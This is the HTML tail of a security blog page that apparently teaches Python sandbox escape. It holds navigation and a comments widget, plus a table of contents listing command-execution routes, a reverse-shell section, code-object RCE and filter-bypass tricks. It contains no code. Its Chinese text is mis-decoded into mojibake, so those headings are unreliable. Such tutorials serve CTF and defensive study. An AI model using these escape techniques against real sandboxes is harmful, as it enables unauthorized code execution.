            <li>
                <strong>Updated at
                    :</strong> 2025-08-19 01:12:40
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/08/12/Python æ²™ç®±é€ƒé€¸/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/python-web/">#python web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/08/12/Python%20%E5%B8%B8%E8%A7%81%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Python å¸¸è§æ¡†æ¶å®‰å…¨</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/08/11/Pickle%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Pickle ååºåˆ—åŒ–</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Python æ²™ç®±é€ƒé€¸</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">Python åŸºç¡€çŸ¥è¯†</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Python-%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%84"><span class="nav-text">Python ç¨‹åºç»“æ„</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%EF%BC%88Module%EF%BC%89"><span class="nav-text">æ¨¡å—ï¼ˆModuleï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8C%85%EF%BC%88Package%EF%BC%89"><span class="nav-text">åŒ…ï¼ˆPackageï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%EF%BC%88Namespace%EF%BC%89"><span class="nav-text">å‘½åç©ºé—´ï¼ˆNamespaceï¼‰</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97"><span class="nav-text">builtins æ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-builtins%EF%BC%9F"><span class="nav-text">ä»€ä¹ˆæ˜¯ builtinsï¼Ÿ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97%E5%86%85%E5%AE%B9"><span class="nav-text">builtins æ¨¡å—å†…å®¹</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%EF%BC%88Built-in-Functions%EF%BC%89"><span class="nav-text">å†…ç½®å‡½æ•°ï¼ˆBuilt-in Functionsï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B%EF%BC%88Built-in-Types%EF%BC%89"><span class="nav-text">å†…ç½®ç±»å‹ï¼ˆBuilt-in Typesï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%BC%82%E5%B8%B8%EF%BC%88Built-in-Exceptions%EF%BC%89"><span class="nav-text">å†…ç½®å¼‚å¸¸ï¼ˆBuilt-in Exceptionsï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%B8%B8%E9%87%8F%EF%BC%88Built-in-Constants%EF%BC%89"><span class="nav-text">å†…ç½®å¸¸é‡ï¼ˆBuilt-in Constantsï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">ä½¿ç”¨åœºæ™¯</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">åŠ¨æ€ä¿®æ”¹å†…ç½®å‡½æ•°</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E5%8F%AF%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">æ§åˆ¶å¯ç”¨çš„å†…ç½®å‡½æ•°</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%9C%81%E6%9C%BA%E5%88%B6%EF%BC%88Introspection%EF%BC%89"><span class="nav-text">å†…çœæœºåˆ¶ï¼ˆIntrospectionï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%B1%BB%E5%9E%8B-%E7%BB%93%E6%9E%84"><span class="nav-text">å¯¹è±¡çš„ç±»å‹&#x2F;ç»“æ„</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1%E6%88%90%E5%91%98"><span class="nav-text">è·å–å¯¹è±¡æˆå‘˜</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="nav-text">å‘½åç©ºé—´ä¸ä½œç”¨åŸŸ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E6%A1%A3%E4%B8%8E%E5%B8%AE%E5%8A%A9"><span class="nav-text">æ–‡æ¡£ä¸å¸®åŠ©</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#inspect-%E6%A8%A1%E5%9D%97"><span class="nav-text">inspect æ¨¡å—</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%B1%9E%E6%80%A7"><span class="nav-text">é­”æœ¯æ–¹æ³• &#x2F; å±æ€§</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97-%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9B%B8%E5%85%B3"><span class="nav-text">æ¨¡å— &#x2F; ä½œç”¨åŸŸç›¸å…³</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins"><span class="nav-text">__builtins__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#import"><span class="nav-text">__import__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dict"><span class="nav-text">__dict__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#class"><span class="nav-text">__class__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bases"><span class="nav-text">__bases__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mro"><span class="nav-text">__mro__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subclasses"><span class="nav-text">__subclasses__()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0-%E6%96%B9%E6%B3%95%E7%9A%84%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">å‡½æ•° &#x2F; æ–¹æ³•çš„æ‰§è¡Œç¯å¢ƒ</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#globals"><span class="nav-text">__globals__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#init"><span class="nav-text">__init__</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E8%8E%B7%E5%8F%96-%E8%AE%BE%E7%BD%AE"><span class="nav-text">å±æ€§è·å– &#x2F; è®¾ç½®</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getattribute-name"><span class="nav-text">__getattribute__(name)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getattr-name"><span class="nav-text">__getattr__(name)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getitem-key"><span class="nav-text">__getitem__(key)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dir"><span class="nav-text">__dir__()</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9B%AE%E6%A0%87"><span class="nav-text">æ²™ç®±é€ƒé€¸ç›®æ ‡</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">å‘½ä»¤æ‰§è¡Œ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#builtin-%E6%A8%A1%E5%9D%97"><span class="nav-text">builtin æ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exec%EF%BC%88%E6%89%A7%E8%A1%8C-Python-%E4%BB%A3%E7%A0%81%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89"><span class="nav-text">execï¼ˆæ‰§è¡Œ Python ä»£ç å­—ç¬¦ä¸²ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval%EF%BC%88%E6%B1%82%E5%80%BC%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%89"><span class="nav-text">evalï¼ˆæ±‚å€¼è¡¨è¾¾å¼ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#os-%E6%A8%A1%E5%9D%97"><span class="nav-text">os æ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system-popen-%E7%B3%BB%E5%88%97%EF%BC%88%E6%9C%80%E7%9B%B4%E8%A7%82%EF%BC%89"><span class="nav-text">system &#x2F; popen ç³»åˆ—ï¼ˆæœ€ç›´è§‚ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#spawn-posix-spawn-%E7%B3%BB%E5%88%97%EF%BC%88%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8C%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%89"><span class="nav-text">spawn &#x2F; posix_spawn ç³»åˆ—ï¼ˆç›´æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec-%E7%B3%BB%E5%88%97%EF%BC%88%E6%9B%BF%E6%8D%A2%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%EF%BC%89"><span class="nav-text">exec* ç³»åˆ—ï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fork-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E5%AD%90%E8%BF%9B%E7%A8%8B%E8%BF%90%E8%A1%8C%EF%BC%89"><span class="nav-text">fork + å‘½ä»¤æ‰§è¡Œï¼ˆå­è¿›ç¨‹è¿è¡Œï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess-%E6%A8%A1%E5%9D%97"><span class="nav-text">subprocess æ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Popen-%E7%B3%BB%E5%88%97%EF%BC%88%E5%BA%95%E5%B1%82%E6%9E%84%E9%80%A0%EF%BC%8C%E7%81%B5%E6%B4%BB%E5%BA%A6%E6%9C%80%E9%AB%98%EF%BC%89"><span class="nav-text">Popen ç³»åˆ—ï¼ˆåº•å±‚æ„é€ ï¼Œçµæ´»åº¦æœ€é«˜ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%BB%E5%A1%9E%E6%89%A7%E8%A1%8C%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%8A%B6%E6%80%81-%E8%BE%93%E5%87%BA"><span class="nav-text">é˜»å¡æ‰§è¡Œå¹¶è·å–çŠ¶æ€&#x2F;è¾“å‡º</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctypes-%E6%A8%A1%E5%9D%97"><span class="nav-text">ctypes æ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux"><span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows"><span class="nav-text">Windows</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#timeit-%E6%A8%A1%E5%9D%97"><span class="nav-text">timeit æ¨¡å—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#platform-%E6%A8%A1%E5%9D%97"><span class="nav-text">platform æ¨¡å—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pty-%E6%A8%A1%E5%9D%97"><span class="nav-text">pty æ¨¡å—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#posixsubprocess-%E6%A8%A1%E5%9D%97"><span class="nav-text">_posixsubprocess æ¨¡å—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9-shell"><span class="nav-text">åå¼¹ shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81%E5%AF%B9%E8%B1%A1%E8%BF%9B%E8%A1%8C-RCE"><span class="nav-text">æ„é€ ä»£ç å¯¹è±¡è¿›è¡Œ RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C-CodeType-%E5%AF%B9%E8%B1%A1"><span class="nav-text">æ‰§è¡Œ CodeType å¯¹è±¡</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0%E7%9A%84-code"><span class="nav-text">æ›¿æ¢å‡½æ•°çš„ code</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%96%B0%E7%9A%84-CodeType-%E5%AF%B9%E8%B1%A1"><span class="nav-text">æ„é€ æ–°çš„ CodeType å¯¹è±¡</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-text">è¯»å†™æ–‡ä»¶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-%E7%B1%BB"><span class="nav-text">file ç±»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#open-%E5%87%BD%E6%95%B0"><span class="nav-text">open å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#codecs-%E6%A8%A1%E5%9D%97"><span class="nav-text">codecs æ¨¡å—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-data-%E5%87%BD%E6%95%B0"><span class="nav-text">get_data å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linecache-%E6%A8%A1%E5%9D%97"><span class="nav-text">linecache æ¨¡å—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#license-%E5%87%BD%E6%95%B0"><span class="nav-text">license å‡½æ•°</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE%E7%9B%AE%E5%BD%95"><span class="nav-text">æšä¸¾ç›®å½•</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#os-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">os æ¨¡å—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#glob-%E6%A8%A1%E5%9D%97"><span class="nav-text">glob æ¨¡å—</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E4%BF%A1%E6%81%AF"><span class="nav-text">è·å–å‡½æ•°ä¿¡æ¯</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%B8%B8%E9%87%8F"><span class="nav-text">è·å–æºä»£ç ä¸­çš„å¸¸é‡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%8F%98%E9%87%8F"><span class="nav-text">è·å–å˜é‡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E5%AD%97%E8%8A%82%E7%A0%81%E5%BA%8F%E5%88%97"><span class="nav-text">è·å–å‡½æ•°å­—èŠ‚ç åºåˆ—</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"><span class="nav-text">è·å–ç¯å¢ƒä¿¡æ¯</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-python-%E7%89%88%E6%9C%AC"><span class="nav-text">è·å– python ç‰ˆæœ¬</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sys-%E6%A8%A1%E5%9D%97"><span class="nav-text">sys æ¨¡å—</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#platform-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">platform æ¨¡å—</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-linux-%E7%89%88%E6%9C%AC"><span class="nav-text">è·å– linux ç‰ˆæœ¬</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#platform-%E6%A8%A1%E5%9D%97-2"><span class="nav-text">platform æ¨¡å—</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%B7%AF%E5%BE%84"><span class="nav-text">è·å–è·¯å¾„</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-text">è·å–å…¨å±€å˜é‡</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#globals-%E5%87%BD%E6%95%B0"><span class="nav-text">globals å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#help-%E5%87%BD%E6%95%B0"><span class="nav-text">help å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vars-%E5%87%BD%E6%95%B0"><span class="nav-text">vars å‡½æ•°</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97%E5%86%85%E9%83%A8%E5%87%BD%E6%95%B0%E6%88%96%E5%8F%98%E9%87%8F"><span class="nav-text">è·å–æ¨¡å—å†…éƒ¨å‡½æ•°æˆ–å˜é‡</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E6%A8%A1%E5%9D%97%E5%86%85%E9%83%A8%E5%8F%98%E9%87%8F"><span class="nav-text">è·å–æŒ‡å®šæ¨¡å—å†…éƒ¨å˜é‡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-main-%E4%B8%AD%E5%8F%98%E9%87%8F"><span class="nav-text">è·å– __main__ ä¸­å˜é‡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%91%BD%E4%BB%A4%E7%A9%BA%E9%97%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F-%E6%A8%A1%E5%9D%97-%E5%87%BD%E6%95%B0%E7%AD%89"><span class="nav-text">è·å–å‘½ä»¤ç©ºé—´ä¸­çš„å˜é‡&#x2F;æ¨¡å—&#x2F;å‡½æ•°ç­‰</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%B2%99%E7%AE%B1"><span class="nav-text">å¸¸è§æ²™ç®±</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#exec-%E6%89%A7%E8%A1%8C"><span class="nav-text">exec æ‰§è¡Œ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eval-%E6%89%A7%E8%A1%8C"><span class="nav-text">eval æ‰§è¡Œ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-audit-hook-%E7%9A%84%E6%B2%99%E7%AE%B1"><span class="nav-text">åŸºäº audit hook çš„æ²™ç®±</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sys-addaudithook-%E6%9E%84%E5%BB%BA%E6%B2%99%E7%AE%B1"><span class="nav-text">sys.addaudithook æ„å»ºæ²™ç®±</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PySys-AddAuditHook-%E6%9E%84%E5%BB%BA%E6%B2%99%E7%AE%B1"><span class="nav-text">PySys_AddAuditHook æ„å»ºæ²™ç®±</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-AST-%E7%9A%84%E6%B2%99%E7%AE%B1"><span class="nav-text">åŸºäº AST çš„æ²™ç®±</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-opcode-%E7%9A%84%E6%B2%99%E7%AE%B1"><span class="nav-text">åŸºäº opcode çš„æ²™ç®±</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%A6%82%E5%BF%B5"><span class="nav-text">å­—èŠ‚ç æ¦‚å¿µ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E7%A4%BA%E4%BE%8B"><span class="nav-text">æ²™ç®±ç¤ºä¾‹</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97%E6%88%96%E6%96%B9%E6%B3%95"><span class="nav-text">ç»•è¿‡åˆ é™¤æ¨¡å—æˆ–æ–¹æ³•</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#reload-%E9%87%8D%E6%96%B0%E5%8A%A0%E8%BD%BD"><span class="nav-text">reload é‡æ–°åŠ è½½</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Python-2-%E4%B8%AD%E7%9A%84%E8%A1%8C%E4%B8%BA"><span class="nav-text">Python 2 ä¸­çš„è¡Œä¸º</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python-3-%E4%B8%AD%E7%9A%84%E8%A1%8C%E4%B8%BA"><span class="nav-text">Python 3 ä¸­çš„è¡Œä¸º</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%81%A2%E5%A4%8D-sys-modules"><span class="nav-text">æ¢å¤ sys.modules</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-globals-%E8%8E%B7%E5%8F%96-builtins-%E6%96%B9%E6%B3%95"><span class="nav-text">ä½¿ç”¨ globals() è·å– builtins æ–¹æ³•</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-gc-%E8%8E%B7%E5%8F%96%E5%B7%B2%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97"><span class="nav-text">åˆ©ç”¨ gc è·å–å·²åˆ é™¤æ¨¡å—</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-traceback-%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97"><span class="nav-text">åˆ©ç”¨ traceback è·å–æ¨¡å—</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="nav-text">ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2"><span class="nav-text">å­—ç¬¦ä¸²å˜æ¢</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="nav-text">å­—ç¬¦ä¸²æ‹¼æ¥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base64-%E5%8F%98%E5%BD%A2"><span class="nav-text">base64 å˜å½¢</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%BA%8F"><span class="nav-text">é€†åº</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="nav-text">è¿›åˆ¶è½¬æ¢</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%BC%96%E7%A0%81"><span class="nav-text">å…¶ä»–ç¼–ç </span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%B1%9E%E6%80%A7%E5%90%8D%E6%88%96%E8%80%85%E5%87%BD%E6%95%B0%E5%90%8D"><span class="nav-text">è¿‡æ»¤äº†å±æ€§åæˆ–è€…å‡½æ•°å</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#getattr-%E5%87%BD%E6%95%B0"><span class="nav-text">getattr å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getattribute-%E5%87%BD%E6%95%B0"><span class="nav-text">__getattribute__ å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getattr-%E5%87%BD%E6%95%B0-1"><span class="nav-text">__getattr__ å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#globals-%E6%9B%BF%E6%8D%A2"><span class="nav-text">__globals__ æ›¿æ¢</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mro-%E3%80%81-bases-%E3%80%81-base-%E4%BA%92%E6%8D%A2"><span class="nav-text">__mro__ã€__bases__ã€__base__ äº’æ¢</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" 